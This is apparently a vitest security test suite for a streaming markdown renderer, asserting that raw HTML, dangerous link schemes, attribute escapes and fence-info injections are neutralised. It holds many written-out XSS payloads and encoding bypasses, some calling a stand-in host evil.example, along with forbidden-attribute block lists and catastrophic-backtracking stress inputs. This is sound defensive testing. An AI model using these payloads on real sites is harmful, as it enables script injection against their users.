import type { RenderedBlock } from '../src'
import { describe, expect, it } from 'vitest'
import { createStreamRenderer } from '../src'

// ---------------------------------------------------------------------------
// HTML 探针：把输出当标签流扫一遍，判定输出里有没有真的标签与属性
// ---------------------------------------------------------------------------

interface HtmlTag {
  readonly name: string
  readonly closing: boolean
  readonly attrs: Readonly<Record<string, string>>
}

/** 匹配一个真标签：`<` 紧跟字母才是标签开始，引号内的 `>` 不算闭合。 */
function tagRe(): RegExp {
  return /<(\/?)([a-z][\w:.-]*)((?=[\s/>])(?:"[^"]*"|'[^']*'|[^>"'])*)>/gi
}

/** 匹配标签内的一个属性，值可带双引号、单引号或裸写。 */
function attrRe(): RegExp {
  return /([^\s"'>/=]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>`]+))?)?/g
}

const NAMED_ENTITIES: Readonly<Record<string, string>> = {
  amp: '&',
  lt: '<',
  gt: '>',
  quot: '"',
  apos: '\'',
  nbsp: '\u00A0',
  colon: ':',
  tab: '\t',
  newline: '\n',
  sol: '/',
  lpar: '(',
  rpar: ')',
  period: '.',
  comma: ',',
}

/** 解码 HTML 实体，只解一层。 */
function decodeEntitiesOnce(input: string): string {
  return input.replace(/&(#x[0-9A-F]+|#\d+|[A-Z][A-Z0-9]*);?/gi, (raw, body: string) => {
    if (body.startsWith('#')) {
      const hex = body[1] === 'x' || body[1] === 'X'
      const code = Number.parseInt(hex ? body.slice(2) : body.slice(1), hex ? 16 : 10)
      if (!Number.isFinite(code) || code < 0 || code > 0x10FFFF)
        return raw
      try {
        return String.fromCodePoint(code)
      }
      catch {
        return raw
      }
    }
    return NAMED_ENTITIES[body.toLowerCase()] ?? raw
  })
}

/** 解码一遍百分号编码，非法序列原样保留。 */
function decodePercentOnce(input: string): string {
  return input.replace(/%([0-9A-F]{2})/gi, (_, hex: string) => String.fromCharCode(Number.parseInt(hex, 16)))
}

/** 把 html 拆成标签列表，属性值解码一次。 */
function parseTags(html: string): readonly HtmlTag[] {
  const out: HtmlTag[] = []
  for (const m of html.matchAll(tagRe())) {
    const attrs: Record<string, string> = {}
    for (const a of (m[3] ?? '').matchAll(attrRe())) {
      const name = a[1]
      if (!name)
        continue
      attrs[name.toLowerCase()] = decodeEntitiesOnce(a[2] ?? a[3] ?? a[4] ?? '')
    }
    out.push({ name: (m[2] ?? '').toLowerCase(), closing: m[1] === '/', attrs })
  }
  return out
}

function openTags(html: string, name: string): readonly HtmlTag[] {
  return parseTags(html).filter(t => t.name === name && !t.closing)
}

/** 去掉所有标签后的可见文本。 */
function textOf(html: string): string {
  return decodeEntitiesOnce(html.replace(tagRe(), ''))
}

/** 剥掉完整标签后仍残留 `<` 开头的标签起手式，说明吐出了半个标签。 */
function hasTruncatedTag(html: string): boolean {
  return /<[a-z/!?]/i.test(html.replace(tagRe(), ''))
}

// ---------------------------------------------------------------------------
// 安全判定
// ---------------------------------------------------------------------------

/** markdown 子集渲染可能产出的标签，此外一律视为注入。 */
const ALLOWED_TAGS: ReadonlySet<string> = new Set([
  'p',
  'br',
  'hr',
  'h1',
  'h2',
  'h3',
  'h4',
  'h5',
  'h6',
  'pre',
  'code',
  'blockquote',
  'ul',
  'ol',
  'li',
  'em',
  'i',
  'strong',
  'b',
  's',
  'del',
  'ins',
  'a',
  'img',
  'table',
  'thead',
  'tbody',
  'tfoot',
  'tr',
  'th',
  'td',
  'span',
  'div',
  'sup',
  'sub',
  'kbd',
  'mark',
  'figure',
  'figcaption',
  'dl',
  'dt',
  'dd',
  'abbr',
  'small',
])

/** 出现即为逃逸成功的属性。 */
const FORBIDDEN_ATTRS: readonly string[] = [
  'srcdoc',
  'formaction',
  'action',
  'xlink:href',
  'background',
  'dynsrc',
  'lowsrc',
  'ping',
  'http-equiv',
  'content',
  'data',
  'codebase',
]

const SAFE_SCHEMES: ReadonlySet<string> = new Set(['http', 'https', 'mailto', 'tel'])

/** 去掉空白、控制字符与不可见字符。 */
function stripUrlNoise(input: string): string {
  return [...input].filter((c) => {
    const p = c.codePointAt(0)!
    return p > 0x20 && !(p >= 0x7F && p <= 0xA0) && p !== 0x2028 && p !== 0x2029 && p !== 0xFEFF
  }).join('')
}

/** 取 URL 可能被浏览器识别出的协议，剥掉空白与控制字符后再判。 */
function schemesOf(url: string): readonly string[] {
  const out: string[] = []
  for (const candidate of [url, decodePercentOnce(url)]) {
    const stripped = stripUrlNoise(candidate).toLowerCase()
    const m = /^([a-z][a-z0-9+.-]*):/.exec(stripped)
    if (m)
      out.push(m[1]!)
  }
  return out
}

function isSafeUrl(url: string): boolean {
  return schemesOf(url).every(s => SAFE_SCHEMES.has(s))
}

/** 输出里不许有越界标签、事件属性、危险协议、半个标签、注释与处理指令。 */
function assertSafeMarkup(html: string, label: string): void {
  expect(hasTruncatedTag(html), `${label} :: 半个标签`).toBe(false)
  expect(/<!/.test(html), `${label} :: 原样注释或文档类型`).toBe(false)
  expect(/<\?/.test(html), `${label} :: 处理指令`).toBe(false)

  for (const tag of parseTags(html)) {
    const at = `${label} :: <${tag.name}>`
    expect(ALLOWED_TAGS.has(tag.name), `${at} 越界标签`).toBe(true)
    for (const [name, value] of Object.entries(tag.attrs)) {
      expect(/^on/i.test(name), `${at} 事件属性 ${name}`).toBe(false)
      expect(FORBIDDEN_ATTRS, `${at} 危险属性 ${name}`).not.toContain(name)
      if (name === 'href' || name === 'src')
        expect(isSafeUrl(value), `${at} ${name}=${JSON.stringify(value)}`).toBe(true)
    }
  }
}

// ---------------------------------------------------------------------------
// 渲染入口
// ---------------------------------------------------------------------------

function renderAll(src: string, ended = true): readonly RenderedBlock[] {
  const r = createStreamRenderer()
  const out = r.render(src, ended ? { ended: true } : undefined)
  r.dispose()
  return out
}

function htmlOf(src: string, ended = true): string {
  return renderAll(src, ended).map(b => b.html).join('\n')
}

/** 整段渲染、未结束渲染、逐字符流式，三条路径都过安全判定。 */
function assertSafeEveryWay(src: string): void {
  const label = JSON.stringify(src)
  assertSafeMarkup(htmlOf(src, true), `${label} 已结束`)
  assertSafeMarkup(htmlOf(src, false), `${label} 未结束`)

  const r = createStreamRenderer()
  for (let i = 1; i <= src.length; i++) {
    const frame = r.render(src.slice(0, i))
    for (const b of frame) {
      expect(b.kind, `${label} @${i}`).not.toBe('html')
      assertSafeMarkup(b.html, `${label} @${i}`)
    }
  }
  r.dispose()
}

// ---------------------------------------------------------------------------
// 探针自检
// ---------------------------------------------------------------------------

/** 归一化后应当被判出危险协议的样本。 */
const EVIL_SCHEME_SAMPLES: readonly string[] = [
  'javascript:alert(1)',
  'JaVaScRiPt:alert(1)',
  ' javascript:alert(1)',
  '\tjavascript:alert(1)',
  '\njavascript:alert(1)',
  '\u0000javascript:alert(1)',
  'java\tscript:alert(1)',
  'java\nscript:alert(1)',
  'java\u0000script:alert(1)',
  '%6Aavascript:alert(1)',
  'vbscript:msgbox(1)',
  'data:text/html,<b>x</b>',
  'file:///etc/passwd',
  'about:blank',
  'blob:https://example.com/x',
]

describe('探针自检', () => {
  it('构造的漏网 html 一定被判为不安全', () => {
    const vulnerable = [
      '<p><script>alert(1)</script></p>',
      '<p><img src="x" onerror="alert(1)"></p>',
      '<p><img src=x onerror=alert(1)></p>',
      '<p><svg onload="alert(1)"></svg></p>',
      '<p><iframe srcdoc="x"></iframe></p>',
      '<p><a href="javascript:alert(1)">x</a></p>',
      '<p><a href="JaVaScRiPt:alert(1)">x</a></p>',
      '<p><a href="java&#115;cript:alert(1)">x</a></p>',
      '<p><a href="&#x6a;avascript:alert(1)">x</a></p>',
      '<p><a href="&#106;avascript:alert(1)">x</a></p>',
      '<p><a href="jav&#x09;ascript:alert(1)">x</a></p>',
      '<p><a href="\u0000javascript:alert(1)">x</a></p>',
      '<p><a href="%6Aavascript:alert(1)">x</a></p>',
      '<p><a href="vbscript:msgbox(1)">x</a></p>',
      '<p><a href="data:text/html,<b>x</b>">x</a></p>',
      '<p><a href="file:///etc/passwd">x</a></p>',
      '<p><img src="data:image/svg+xml,x"></p>',
      '<p>半个 <a href="',
      '<p><!--x--></p>',
    ]
    for (const html of vulnerable)
      expect(() => assertSafeMarkup(html, 'self'), html).toThrow()
  })

  it('被转义的危险串留在文本里判为安全', () => {
    const benign = [
      '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>',
      '<p>&lt;img src=x onerror=alert(1)&gt;</p>',
      '<p><code>onerror=&quot;alert(1)&quot;</code></p>',
      '<p><a href="https://example.com" title="标题&gt;&lt;script&gt;">x</a></p>',
      '<p><img src="https://example.com/a.png" alt="替代&quot; onerror=&quot;alert(1)"></p>',
      '<p><a href="java&amp;#115;cript:alert(1)">x</a></p>',
      '<p><a href="/rel/path">x</a></p>',
      '<p><a href="#anchor">x</a></p>',
      '<p><a href="mailto:a@example.com">x</a></p>',
      '<p><a href="tel:+8613800000000">x</a></p>',
      '<pre><code class="language-ts">x</code></pre>',
    ]
    for (const html of benign)
      expect(() => assertSafeMarkup(html, 'self'), html).not.toThrow()
  })

  it('协议判定认得各种绕过写法', () => {
    for (const url of EVIL_SCHEME_SAMPLES)
      expect(isSafeUrl(url), url).toBe(false)
    for (const url of ['https://example.com/a?b=1', 'http://example.com', 'mailto:a@example.com', 'tel:+86138', '/a/b', './a', '#a', '?q=1', 'a/b.png', '//example.com/a'])
      expect(isSafeUrl(url), url).toBe(true)
  })
})

// ---------------------------------------------------------------------------
// 原始标签
// ---------------------------------------------------------------------------

const RAW_TAG_PAYLOADS: readonly string[] = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<script\n>alert(1)</script>',
  '<script\t>alert(1)</script>',
  '<script/xss src=//evil.example></script>',
  '<script >alert(String.fromCharCode(88))</script >',
  '<script>alert(1)//',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<IFRAME SRC=//evil.example></IFRAME>',
  '<img src=x onerror=alert(1)>',
  '<img src="x" onerror="alert(1)">',
  '<img src=x onerror=alert(1)//',
  '<IMG SRC=/ ONERROR="alert(1)">',
  '<img\nsrc=x\nonerror=alert(1)>',
  '<img src=`x` onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<svg/onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
  '<body onload=alert(1)>',
  '<a href="javascript:alert(1)">点我</a>',
  '<a href=javascript:alert(1)>点我</a>',
  '<div style="width:expression(alert(1))">x</div>',
  '<style>@import url(//evil.example/x.css);</style>',
  '<base href="javascript:">',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<link rel=stylesheet href=//evil.example/x.css>',
  '<form action=//evil.example><button formaction=javascript:alert(1)>发</button></form>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src=//evil.example/x.swf>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<template><script>alert(1)</script></template>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<!--<img src=x onerror=alert(1)>-->',
  '<!DOCTYPE html><html><head></head></html>',
  '<?xml version="1.0"?><x/>',
  '<![CDATA[<script>alert(1)</script>]]>',
  '<textarea></textarea><img src=x onerror=alert(1)>',
  '<xmp><img src=x onerror=alert(1)></xmp>',
  '<plaintext><img src=x onerror=alert(1)>',
  '<input autofocus onfocus=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<marquee onstart=alert(1)>x</marquee>',
  '<video><source onerror=alert(1)>',
  '<isindex action=javascript:alert(1) type=submit>',
]

describe('原始 HTML 标签', () => {
  it('全部降级成文本，不产出越界标签与事件属性', () => {
    for (const src of RAW_TAG_PAYLOADS) assertSafeEveryWay(src)
  }, 60_000)

  it('转义后的内容留在文本节点里', () => {
    const html = htmlOf('<script>alert(1)</script>')
    expect(textOf(html)).toContain('<script>alert(1)</script>')
    expect(openTags(html, 'script')).toHaveLength(0)
  })

  it('段落之间夹带的标签也被转义', () => {
    for (const b of renderAll('正文一。\n\n<img src=x onerror=alert(1)>\n\n正文二。')) {
      expect(b.kind).not.toBe('html')
      assertSafeMarkup(b.html, b.key)
    }
  })

  it('块级 HTML 不产出 html 种类的块', () => {
    const sources = [
      '<div>\n\n块级\n\n</div>',
      '<table><tr><td>x</td></tr></table>',
      '<p>段</p>',
      '<!-- 注释 -->\n\n正文',
    ]
    for (const src of sources) {
      for (const b of renderAll(src)) expect(b.kind, src).not.toBe('html')
    }
  })

  it('围栏代码块里的标签也不成标签', () => {
    const html = htmlOf('```html\n<img src=x onerror=alert(1)>\n<script>alert(1)</script>\n```')
    assertSafeMarkup(html, '围栏内标签')
    expect(textOf(html)).toContain('<img src=x onerror=alert(1)>')
  })
})

// ---------------------------------------------------------------------------
// 协议白名单
// ---------------------------------------------------------------------------

const EVIL_URLS: readonly string[] = [
  'javascript:alert(1)',
  'JaVaScRiPt:alert(1)',
  'JAVASCRIPT:alert(1)',
  'javascript :alert(1)',
  'java\tscript:alert(1)',
  'java\nscript:alert(1)',
  'java\rscript:alert(1)',
  'java\u000Bscript:alert(1)',
  'java\u000Cscript:alert(1)',
  'java\u0000script:alert(1)',
  '\u0000javascript:alert(1)',
  '\u0001javascript:alert(1)',
  '\u200Bjavascript:alert(1)',
  'jav&#x09;ascript:alert(1)',
  'jav&#x0A;ascript:alert(1)',
  'jav&#x0D;ascript:alert(1)',
  'java&#115;cript:alert(1)',
  'java&#0115;cript:alert(1)',
  '&#x6a;avascript:alert(1)',
  '&#X6A;avascript:alert(1)',
  '&#106;avascript:alert(1)',
  '&#0000106avascript:alert(1)',
  '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)',
  'javascript&colon;alert(1)',
  'javascript&#58;alert(1)',
  'javascript&#x3a;alert(1)',
  '%6Aavascript:alert(1)',
  '%6a%61%76%61%73%63%72%69%70%74:alert(1)',
  'javascript:%61lert(1)',
  'vbscript:msgbox(1)',
  'VBScript:msgbox(1)',
  'vbscript&#58;msgbox(1)',
  'vb\tscript:msgbox(1)',
  'data:text/html,<script>alert(1)</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  'data:image/svg+xml,<svg onload=alert(1)>',
  'DATA:text/html,<b>x</b>',
  'da\tta:text/html,<b>x</b>',
  'file:///etc/passwd',
  'about:blank',
  'blob:https://evil.example/x',
  'view-source:https://evil.example',
  'jar:https://evil.example!/x',
  'jAvAsCrIpT:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//',
]

/** 危险 URL 的各种承载形式。 */
function urlCarriers(url: string): readonly string[] {
  return [
    `[点我](${url})`,
    `[点我](<${url}>)`,
    `[点我](${url} "标题")`,
    `![图](${url})`,
    `![图](<${url}>)`,
    `<${url}>`,
    `[点我][ref]\n\n[ref]: ${url}`,
    `[点我][ref]\n\n[ref]: <${url}> "标题"`,
    `![图][ref]\n\n[ref]: ${url}`,
    `[ref]\n\n[ref]: ${url}`,
    `[ref][]\n\n[ref]: ${url}`,
    `- [点我](${url})`,
    `> [点我](${url})`,
    `| 甲 |\n| --- |\n| [点我](${url}) |`,
    `# [点我](${url})`,
  ]
}

describe('链接协议白名单', () => {
  it('危险协议在各种承载形式下都不成链接', () => {
    for (const url of EVIL_URLS) {
      for (const src of urlCarriers(url)) {
        const html = htmlOf(src)
        assertSafeMarkup(html, JSON.stringify(src))
        for (const a of openTags(html, 'a')) {
          if (a.attrs.href !== undefined)
            expect(isSafeUrl(a.attrs.href), `${src} :: href=${JSON.stringify(a.attrs.href)}`).toBe(true)
        }
        for (const img of openTags(html, 'img')) {
          if (img.attrs.src !== undefined)
            expect(isSafeUrl(img.attrs.src), `${src} :: src=${JSON.stringify(img.attrs.src)}`).toBe(true)
        }
      }
    }
  }, 60_000)

  it('危险协议逐字符喂入的每一帧都不成链接', () => {
    for (const url of EVIL_URLS.slice(0, 12)) {
      assertSafeEveryWay(`[点我](${url})`)
      assertSafeEveryWay(`![图](${url})`)
    }
  }, 60_000)

  it('白名单内的协议与相对路径照常成链接', () => {
    const safe = [
      'https://example.com/a?b=1&c=2#d',
      'http://example.com',
      'mailto:someone@example.com',
      'tel:+8613800000000',
      '/abs/path',
      './rel/path',
      'rel/path.png',
      '#anchor',
    ]
    for (const url of safe) {
      const a = openTags(htmlOf(`[点我](${url})`), 'a')[0]
      expect(a, url).toBeDefined()
      expect(a!.attrs.href, url).toBeDefined()
      expect(isSafeUrl(a!.attrs.href!), url).toBe(true)
    }
    const img = openTags(htmlOf('![图](https://example.com/a.png)'), 'img')[0]
    expect(img).toBeDefined()
    expect(img!.attrs.src).toBe('https://example.com/a.png')
  })

  it('自动链接只放行白名单协议', () => {
    expect(openTags(htmlOf('<https://example.com>'), 'a')).toHaveLength(1)
    expect(openTags(htmlOf('<someone@example.com>'), 'a').every(a => isSafeUrl(a.attrs.href ?? ''))).toBe(true)
    for (const url of ['javascript:alert(1)', 'vbscript:msgbox(1)', 'data:text/html,<b>x</b>', 'file:///etc/passwd']) {
      const html = htmlOf(`<${url}>`)
      expect(openTags(html, 'a').filter(a => !isSafeUrl(a.attrs.href ?? '')), url).toHaveLength(0)
    }
  })
})

// ---------------------------------------------------------------------------
// 属性逃逸
// ---------------------------------------------------------------------------

const ATTR_ESCAPE_PAYLOADS: readonly string[] = [
  '[点我](https://example.com" onmouseover="alert(1))',
  '[点我](https://example.com\' onmouseover=\'alert(1))',
  '[点我](<https://example.com" onmouseover="alert(1)>)',
  '[点我](https://example.com "标题\\" onmouseover=\\"alert(1)")',
  '[点我](https://example.com "标题><script>alert(1)</script>")',
  '[点我](https://example.com \'标题><img src=x onerror=alert(1)>\')',
  '[点我](https://example.com?a=%22%3E%3Cscript%3Ealert(1)%3C/script%3E)',
  '[点我](https://example.com#">)',
  '[点我](https://example.com "多行\n标题")',
  '![图](https://example.com/a.png" onerror="alert(1))',
  '![图](https://example.com/a.png "标题" onerror="alert(1)")',
  '![替代" onerror="alert(1)](https://example.com/a.png)',
  '![替代><script>alert(1)</script>](https://example.com/a.png)',
  '[点我][ref]\n\n[ref]: https://example.com "标题\\" onload=\\"alert(1)"',
  '[点我][ref]\n\n[ref]: https://example.com" onmouseover="alert(1)',
  '![图][ref]\n\n[ref]: https://example.com/a.png \'标题\' onerror=\'alert(1)\'',
  '<https://example.com" onmouseover="alert(1)>',
  '<https://example.com/><script>alert(1)</script>',
  '[点我](https://example.com/`onmouseover=`alert(1))',
  '[点我](https://example.com/ "标题\u0000><img src=x onerror=alert(1)>")',
]

describe('属性逃逸', () => {
  it('引号尖括号换行都拼不出新属性', () => {
    for (const src of ATTR_ESCAPE_PAYLOADS) assertSafeEveryWay(src)
  }, 60_000)

  it('链接只带 href 与 title，不多出属性', () => {
    const allowed = new Set(['href', 'title', 'target', 'rel', 'class'])
    for (const src of ATTR_ESCAPE_PAYLOADS) {
      for (const a of openTags(htmlOf(src), 'a')) {
        for (const name of Object.keys(a.attrs))
          expect([...allowed], `${src} :: ${name}`).toContain(name)
      }
    }
  })

  it('图片只带 src / alt / title，不多出属性', () => {
    const allowed = new Set(['src', 'alt', 'title', 'loading', 'class'])
    for (const src of ATTR_ESCAPE_PAYLOADS) {
      for (const img of openTags(htmlOf(src), 'img')) {
        for (const name of Object.keys(img.attrs))
          expect([...allowed], `${src} :: ${name}`).toContain(name)
      }
    }
  })

  it('注入串没有变成额外的标签', () => {
    for (const src of ATTR_ESCAPE_PAYLOADS) {
      const html = htmlOf(src)
      expect(openTags(html, 'script'), src).toHaveLength(0)
      expect(openTags(html, 'b').length + openTags(html, 'svg').length, src).toBe(0)
    }
  })

  it('href 里的引号被转成实体', () => {
    const html = htmlOf('[点我](https://example.com" onmouseover="alert(1))')
    expect(/onmouseover\s*=/i.test(html.replace(/&quot;|&#0*3[49];|&apos;/gi, ''))
      && openTags(html, 'a').some(a => 'onmouseover' in a.attrs)).toBe(false)
  })
})

// ---------------------------------------------------------------------------
// 围栏信息串
// ---------------------------------------------------------------------------

const FENCE_INFO_PAYLOADS: readonly string[] = [
  '```ts" onload="alert(1)\nx\n```',
  '```ts\' onload=\'alert(1)\nx\n```',
  '```<script>alert(1)</script>\nx\n```',
  '```js class="x" onclick="alert(1)"\nx\n```',
  '```js><img src=x onerror=alert(1)>\nx\n```',
  '```javascript:alert(1)\nx\n```',
  '```../../etc/passwd\nx\n```',
  '```语言 里带空格\nx\n```',
  '~~~ts onmouseover=alert(1)\nx\n~~~',
  '~~~"><svg onload=alert(1)>\nx\n~~~',
  '```&#106;avascript\nx\n```',
  '```ts\u0000\nx\n```',
  '```ts\n未闭合',
]

describe('围栏信息串', () => {
  it('注入的信息串不落成属性', () => {
    for (const src of FENCE_INFO_PAYLOADS) assertSafeEveryWay(src)
  }, 60_000)

  it('lang 要么缺省要么是干净的短标识', () => {
    for (const src of FENCE_INFO_PAYLOADS) {
      const lang = renderAll(src).at(-1)!.lang
      if (lang !== undefined)
        expect(lang, src).toMatch(/^[\w+#.-]{1,24}$/)
    }
    expect(renderAll(`\`\`\`${'a'.repeat(500)}\nx\n\`\`\``).at(-1)!.lang).toBeUndefined()
  })

  it('干净的语言标注照常透传', () => {
    for (const lang of ['ts', 'js', 'python', 'json', 'bash']) {
      expect(renderAll(`\`\`\`${lang}\nx\n\`\`\``).at(-1)!.lang, lang).toBe(lang)
    }
  })
})

// ---------------------------------------------------------------------------
// 综合语料
// ---------------------------------------------------------------------------

describe('混排语料', () => {
  it('危险片段混进正常 markdown 也不越界', () => {
    const sources = [
      '# 标题 <img src=x onerror=alert(1)>\n\n段落 [点我](javascript:alert(1))\n\n```html\n<script>alert(1)</script>\n```',
      '> 引用里的 <svg onload=alert(1)>\n> 与 [链接](vbscript:msgbox(1))',
      '- <iframe src=javascript:alert(1)></iframe>\n- ![图](data:text/html,<b>x</b>)',
      '| 甲 | 乙 |\n| --- | --- |\n| <script>alert(1)</script> | [点我](javascript:alert(1)) |',
      '**<img src=x onerror=alert(1)>** 与 `<svg onload=alert(1)>` 与 ~~<script>x</script>~~',
      '[点我](https://example.com)<script>alert(1)</script>',
    ]
    for (const src of sources) assertSafeEveryWay(src)
  }, 60_000)

  it('每一块都不是 html 种类', () => {
    const src = '<div>x</div>\n\n<script>alert(1)</script>\n\n正文\n\n<!-- 注释 -->'
    for (const b of renderAll(src)) expect(b.kind, b.key).not.toBe('html')
  })
})

// ---------------------------------------------------------------------------
// 深嵌套与灾难性回溯
// ---------------------------------------------------------------------------

const BUDGET_MS = 2000

/** 渲染一次并返回耗时，抛错直接冒泡。 */
function timeRender(src: string): number {
  const started = Date.now()
  const r = createStreamRenderer()
  r.render(src, { ended: true })
  r.dispose()
  return Date.now() - started
}

const STRESS_PAYLOADS: readonly [name: string, src: string][] = [
  ['未闭合方括号', '['.repeat(5000)],
  ['方括号配对', `${'['.repeat(2000)}文${']'.repeat(2000)}`],
  ['链接壳嵌套', '[](['.repeat(2000)],
  ['图片壳嵌套', '!['.repeat(3000)],
  ['星号串', '*'.repeat(20000)],
  ['双星号串', '**'.repeat(5000)],
  ['交替强调', 'a *'.repeat(3000)],
  ['下划线串', '_'.repeat(20000)],
  ['反引号串', '`'.repeat(5000)],
  ['波浪号串', '~~'.repeat(5000)],
  ['反斜杠串', '\\'.repeat(20000)],
  ['尖括号串', '<'.repeat(20000)],
  ['与号串', '&#'.repeat(20000)],
  ['深引用', `${'> '.repeat(2000)}文`],
  ['深缩进列表', Array.from({ length: 500 }, (_, i) => `${' '.repeat(i * 2)}- 项`).join('\n')],
  ['长表格行', `|${'a|'.repeat(5000)}\n|${'-|'.repeat(5000)}\n|${'b|'.repeat(5000)}`],
  ['超长单词', 'a'.repeat(100000)],
  ['围栏串', '```'.repeat(2000)],
  ['未闭合围栏加长内容', `\`\`\`ts\n${'x'.repeat(100000)}`],
  ['长 URL', `[点我](https://example.com/${'a'.repeat(50000)})`],
  ['危险协议加长尾', `[点我](javascript:${'a'.repeat(50000)})`],
  ['多空行', '\n'.repeat(50000)],
  ['多段落', Array.from({ length: 2000 }, (_, i) => `第 ${i} 段。`).join('\n\n')],
  ['嵌套引用加强调', `${'> '.repeat(500)}${'**'.repeat(500)}文`],
]

describe('深嵌套与灾难性回溯', () => {
  it('每条压力语料都在预算内完成且不抛错', () => {
    for (const [name, src] of STRESS_PAYLOADS) {
      let elapsed = -1
      expect(() => {
        elapsed = timeRender(src)
      }, name).not.toThrow()
      expect(elapsed, `${name} 耗时 ${elapsed}ms`).toBeLessThan(BUDGET_MS)
    }
  }, 120_000)

  it('压力语料在截断点续喂也在预算内', () => {
    for (const [name, src] of STRESS_PAYLOADS) {
      const cuts = [Math.floor(src.length / 4), Math.floor(src.length / 2), Math.floor((src.length * 3) / 4)]
      const started = Date.now()
      const r = createStreamRenderer()
      for (const cut of cuts) r.render(src.slice(0, cut))
      r.render(src, { ended: true })
      r.dispose()
      expect(Date.now() - started, name).toBeLessThan(BUDGET_MS * 2)
    }
  }, 120_000)

  it('深嵌套的输出仍然安全', () => {
    for (const [name, src] of STRESS_PAYLOADS.slice(0, 14)) {
      for (const b of renderAll(src)) {
        expect(b.kind, name).not.toBe('html')
        expect(hasTruncatedTag(b.html), name).toBe(false)
      }
    }
  }, 60_000)
})

// ---------------------------------------------------------------------------
// 畸形输入
// ---------------------------------------------------------------------------

describe('畸形输入', () => {
  const MALFORMED: readonly string[] = [
    '\u0000',
    '文\u0000本',
    '�',
    '\uD800',
    '文\uD800本',
    '\uDFFF\uD800',
    '\u2028\u2029',
    '\r\r\n\n',
    '\u200B\u200C\u200D\uFEFF',
    '\u202E文本',
    '&#x110000;',
    '&#999999999;',
    '&&&&&&',
    '&#;&#x;&;',
    '%%%%',
    '\\\\\\',
  ]

  it('不崩、不吐半个标签、不越界', () => {
    for (const src of MALFORMED) {
      expect(() => renderAll(src), JSON.stringify(src)).not.toThrow()
      assertSafeMarkup(htmlOf(src), JSON.stringify(src))
      assertSafeMarkup(htmlOf(src, false), JSON.stringify(src))
    }
  })

  it('释放之后不再产出', () => {
    const r = createStreamRenderer()
    r.render('<script>alert(1)</script>')
    r.dispose()
    expect(r.render('<img src=x onerror=alert(1)>')).toEqual([])
  })
})

describe('协议白名单的空白绕过', () => {
  // 校验用的串与返回的串若在字符集合上有差异，差异处就是绕过点。
  // Unicode 空白里 String.trim 认、剥离函数不认的那几个曾能穿过白名单。
  const SPACES = ['\u1680', '\u205F', '\u2000', '\u2028', '\u202F', '\u3000', '\uFEFF', '\u00A0', '\t', ' ']

  it('协议前插各类空白仍不成链接', () => {
    const r = createStreamRenderer()
    for (const sp of SPACES) {
      for (const src of [`[a](<${sp}javascript:alert(1)>)`, `![a](<${sp}javascript:alert(1)>)`]) {
        const html = r.render(src).map(b => b.html).join('')
        expect(html, JSON.stringify(src)).not.toMatch(/href="javascript|src="javascript/)
      }
    }
  })

  it('协议中间插空白仍不成链接', () => {
    const r = createStreamRenderer()
    for (const sp of SPACES) {
      const html = r.render(`[a](<java${sp}script:alert(1)>)`).map(b => b.html).join('')
      expect(html, JSON.stringify(sp)).not.toMatch(/href="javascript/)
    }
  })

  it('引用式定义走同一条校验', () => {
    const r = createStreamRenderer()
    for (const sp of SPACES) {
      const html = r.render(`[a][k]\n\n[k]: <${sp}javascript:alert(1)>`).map(b => b.html).join('')
      expect(html, JSON.stringify(sp)).not.toMatch(/href="javascript/)
    }
  })
})
